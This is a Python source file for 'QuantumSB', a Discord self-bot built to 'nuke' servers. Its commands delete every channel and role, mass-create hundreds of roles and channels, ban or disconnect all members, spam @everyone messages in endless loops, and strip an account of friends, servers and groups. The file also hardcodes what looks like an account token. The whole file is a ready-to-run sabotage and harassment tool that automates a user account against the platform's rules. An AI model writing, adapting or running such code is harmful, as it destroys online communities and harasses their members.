import discord
from discord.ext import commands
from aiohttp import request
import random
import time
import os
import numpy
import string
import discum
import json
from colorama import init, Fore, Back, Style
from datetime import datetime
with open('config.json') as f:
    config = json.load(f)
version = "2"
token = config.get('token')
silent = config.get('silent')
prefix = config.get('prefix')
user = config.get('user')
JumboPic = "https://upload.wikimedia.org/wikipedia/commons/thumb/a/ae/Nuclear_symbol.svg/1200px-Nuclear_symbol.svg.png"
BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = Fore.BLUE, Fore.RED, Fore.WHITE, Fore.YELLOW, Fore.MAGENTA, Fore.MAGENTA, '\033[0m'
helplog = ('''
[Server] Server commands
[Account] Account commands
''')
serverlog = ('''
[Destory] Deletes everything
[Ban_all] Bans all members
[Role_delete] Deletes all roles
[Role_spam] Spams roles
[Channel_delete] Deletes all channels
[Channel_spam] Spams channels
''')
accountlog = ('''
[Friend_remove] Removing all friends
[Server_remove] Removing all servers
[Group_remove] Removes all groups
''')
trollog = ('''
[Disconnect_all] Removing all users from VC
''')
if silent == 'off':
    print(f"{MAGENTA}[{RED}!{MAGENTA}] Silent mode is off, this can result in bans if not careful.{MAGENTA}[{RED}!{MAGENTA}]")
    input(f"{MAGENTA}Press any key to continue...")
else:
    pass;
botcum = discum.Client(token='OTA1MTkxOTE5Njk5NzcxMzkz.YZ0qPw.WOwVeCvBjS9Q7EW_TqjIt-Be_-E', log=True)
client = commands.Bot(command_prefix = f'{prefix}', self_bot=True)
main = (f''' 

{MAGENTA} ██████╗ ██╗   ██╗ █████╗ ███╗   ██╗████████╗██╗   ██╗███╗   ███╗
{WHITE}██╔═══██╗██║   ██║██╔══██╗████╗  ██║╚══██╔══╝██║   ██║████╗ ████║
{MAGENTA}██║   ██║██║   ██║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║
{WHITE}██║▄▄ ██║██║   ██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║
{MAGENTA}╚██████╔╝╚██████╔╝██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║
{WHITE} ╚══▀▀═╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝

{WHITE}                                                
-------------------{WHITE}By {MAGENTA}[{WHITE}JAM#2105{MAGENTA}]{WHITE}
-------------------Version : {MAGENTA}{version}{WHITE}
-------------------Silent mode : {MAGENTA}{silent}{WHITE}
-------------------Type {MAGENTA}{prefix}{WHITE}help for commands
-------------------QuantumSB Succeslfully Connected To [{WHITE}{MAGENTA}{user}{WHITE}]

----------------------------------------------------------------
''')
client.remove_command('help')
@client.event
async def on_ready():
    print(main)
    print(f"{MAGENTA}[{WHITE}+{MAGENTA}] Discord.py Succeslfully Connected {MAGENTA}[{WHITE}+{MAGENTA}]")
@botcum.gateway.command
def resptest(resp):
	if resp.event.message:
		print(resp.raw) #raw response
		print(resp.parsed.message_create()['type'] == resp.parsed.auto()['type']) #will print True
@client.command()
async def help(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=ctx.author.color)
    embed.set_author(name="Nuke Bot / Made by Jamable#6264")
    embed.add_field(name="Server", value="\nServer commands", inline=False)
    embed.add_field(name="Account", value="\nAccount commands", inline=False)
    embed.set_thumbnail(url=JumboPic)
    if silent == 'off':
        await ctx.send(embed=embed)
    else:
        print(helplog)
        
#server
@client.command()
async def server(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=ctx.author.color)
    embed.set_author(name="Server commands / Made by Jamable#6264")
    embed.add_field(name="Destory", value="\nDeletes everything!", inline=False)
    embed.add_field(name="Ban_all", value="\nBans all users", inline=False)
    embed.add_field(name="Role_delete", value="\nDeletes all roles", inline=False)
    embed.add_field(name="Role_spam", value="\nSpams roles", inline=False)
    embed.add_field(name="Channel_delete", value="\nDeletes all channels", inline=False)
    embed.add_field(name="Channel_spam", value="\nDeletes all channels", inline=False)
    embed.add_field(name="Spam_ping", value="\nSpams a msg in all channels", inline=False)
    embed.add_field(name="Destroy_ping", value="\nSpams a msg in all channels infintly", inline=False)
    embed.set_thumbnail(url=JumboPic)
    if silent == 'off':
        await ctx.send(embed=embed)
    else:
        print(serverlog)
#account
@client.command()
async def account(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=ctx.author.color)
    embed.set_author(name="Acount commands / Made by Jamable#6264")
    embed.add_field(name="Friend_remove", value="\nRemoves all friends.", inline=False)
    embed.add_field(name="Guild_remove", value="\nRemoves all guilds.", inline=False)
    embed.add_field(name="Group_remove", value="\nRemoves all guilds.", inline=False)
    embed.set_thumbnail(url=JumboPic)
    if silent == 'off':
        await ctx.send(embed=embed)
    else:
        print(accountlog)
@client.command()
async def troll(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=ctx.author.color)
    embed.set_author(name="Acount commands / Made by Jamable#6264")
    embed.add_field(name="Disconnect_all", value="\nRemoves all users from VC.", inline=False)
    embed.set_thumbnail(url=JumboPic)
    if silent == 'off':
        await ctx.send(embed=embed)
    else:
        print(accountlog)
#group remove
@client.command()
async def group_remove(ctx):
    await ctx.message.delete()
    if silent == 'off':
        await ctx.send(f"`Removing groups`")
    else:
        print(f"{WHITE}[{MAGENTA}!{WHITE}] Remove groups")
    for channel in client.private_channels:
        try:
            if isinstance(channel, discord.GroupChannel):  
                    count = count + 1
                    await channel.leave()
        except:
            pass
#guildsremove
@client.command()
async def guild_remove(ctx):
    await ctx.message.delete()
    if silent == 'off':
        await ctx.send(f"`Removing guilds`")
    else:
        print(f"{WHITE}[{MAGENTA}!{WHITE}] Removed guilds {WHITE}[{MAGENTA}!{WHITE}]")
    for guild in client.guilds:
        try:
            await guild.leave()    
        except:
            pass
#friendremove
@client.command()
async def friend_remove(ctx):
    await ctx.message.delete()
    if silent == 'off':
        await ctx.send(f"`Removing friends`")
    else:
        print(f"{WHITE}[{MAGENTA}!{WHITE}] Removed friends {WHITE}[{MAGENTA}!{WHITE}]")
    for user in client.user.friends:
        try:
            await user.remove()    
        except:
            pass
#channeldelete
@client.command()
async def channel_delete(ctx):
    await ctx.message.delete()
    if silent == 'off':
        await ctx.send(f"`Deleting channels`")
    else:
        print(f"{WHITE}[{MAGENTA}!{WHITE}] Removed channels {WHITE}[{MAGENTA}!{WHITE}]")
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()    
        except:
            pass
#spamping
@client.command()
async def spam_ping(ctx, *, message):
    await ctx.message.delete()
    if silent == 'off':
        await ctx.send(f"`Spamming channels`")
    else:
        print(f"{WHITE}[{MAGENTA}!{WHITE}] Spamming channels {WHITE}[{MAGENTA}!{WHITE}]")
    for channel in list(ctx.guild.channels):
        try:
            for _i in range(25):
                await channel.send(f"@everyone {message}")    
        except:
            pass
#destroyping
@client.command()
async def destroy_ping(ctx, *, message):
    await ctx.message.delete()
    if silent == 'off':
        await ctx.send(f"`Spamming channels`")
    else:
        print(f"{WHITE}[{MAGENTA}!{WHITE}] Spamming channels {WHITE}[{MAGENTA}!{WHITE}]")
    for channel in list(ctx.guild.channels):
        try:
            while True:
                for _i in range(25):
                    await channel.send(f"@everyone {message}")    
        except:
            pass
#ban all (doesnt work)
@client.command()
async def ban_all(ctx):
    if silent == 'off':
        await ctx.send(f"`Banning all users`")
    else:
        print(f"{WHITE}[{MAGENTA}!{WHITE}] Banning all users {WHITE}[{MAGENTA}!{WHITE}]")
    async for member in ctx.guild.fetch_members(limit=None):
        try:
            await member.ban(reason="Discord nuked by {Client.user.name}")
        except:
            pass   
        await member.move_to(None)
#disconnect all
@client.command()
async def disconnect_all(ctx):
    if silent == 'off':
        await ctx.send(f"`Disconnecting all users`")
    else:
        print(f"{WHITE}[{MAGENTA}!{WHITE}] Disconnecting all users {WHITE}[{MAGENTA}!{WHITE}]")
    async for member in ctx.guild.fetch_members(limit=None):
        try:
            await member.move_to(None)
        except:
            pass   
#role delete
@client.command()
async def role_delete(ctx):
    await ctx.message.delete()
    if silent == 'off':
        await ctx.send(f"`Deleting all roles`")
    else:
        print(f"{WHITE}[{MAGENTA}!{WHITE}] Deleting all roles {WHITE}[{MAGENTA}!{WHITE}]")
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass
#role spam
@client.command()
async def role_spam(ctx, *, name):
    await ctx.message.delete()
    if silent == 'off':
        await ctx.send(f"`Spamming roles`")
    else:
        print(f"{WHITE}[{MAGENTA}!{WHITE}] Spamming roles {WHITE}[{MAGENTA}!{WHITE}]")
    for _i in range(250):
        await ctx.guild.create_role(name=f"{name}")
#channel spam
@client.command()
async def channel_spam(ctx, *, name):
    await ctx.message.delete()
    if silent == 'off':
        await ctx.send(f"`Spamming channels`")
    else:
        print(f"{WHITE}[{MAGENTA}!{WHITE}] Spamming channels {WHITE}[{MAGENTA}!{WHITE}]")
    for _i in range(250):
        await ctx.guild.create_text_channel(name=f"{name}")
#vc spam
@client.command()
async def vc_spam(ctx, *, name):
    await ctx.message.delete()
    if silent == 'off':
        await ctx.send(f"`Spamming vcs`")
    else:
        print(f"{WHITE}[{MAGENTA}!{WHITE}] Spamming vcs {WHITE}[{MAGENTA}!{WHITE}]")
    for _i in range(250):
        await ctx.guild.create_voice_channel(name=f"{name}")
#command error
@client.event
async def on_command_error(ctx, error):
    error_str = str(error)
    error = getattr(error, 'original', error)
    if isinstance(error, commands.CommandNotFound):
        print(f"[ERROR] Command not found!")
    elif isinstance(error, commands.CheckFailure):
        print('[ERROR]: You\'re missing permission to execute this command')
    elif isinstance(error, commands.MissingRequiredArgument):
        print(f"[ERROR]: Missing arguments: {error}")
    elif isinstance(error, numpy.AxisError):
        print('Invalid Image', delete_after=3)
    elif isinstance(error, discord.errors.Forbidden):
        print(f"[ERROR]: 404 Forbidden Access: {error}")
    elif "Cannot send an empty message" in error_str:
        print('[ERROR]: Message contents cannot be null')
    else:
        print(f'[ERROR]: {error_str}')
#destroy
@client.command()
async def destroy(ctx):
    await ctx.message.delete()
    if silent == 'off':
        await ctx.send(f"Destorying everything")
    else:
        print(f"{WHITE}[{MAGENTA}!{WHITE}] Destroying everything {WHITE}[{MAGENTA}!{WHITE}]") 
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()    
        except:
            pass
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass
    for _i in range(250):
        await ctx.guild.create_role(name=f"Nuked-by-{client.user.name}")
    for _i in range(250):
        await ctx.guild.create_text_channel(name=f"Nuked-by-{client.user.name}")
    if silent == 'off':
        await ctx.send(f"Attack finished")
    else:
        print(f"{WHITE}[{MAGENTA}!{WHITE}] Attack finished {WHITE}[{MAGENTA}!{WHITE}]") 
client.run(token, bot=False)
botcum.gateway.run(auto_reconnect=True)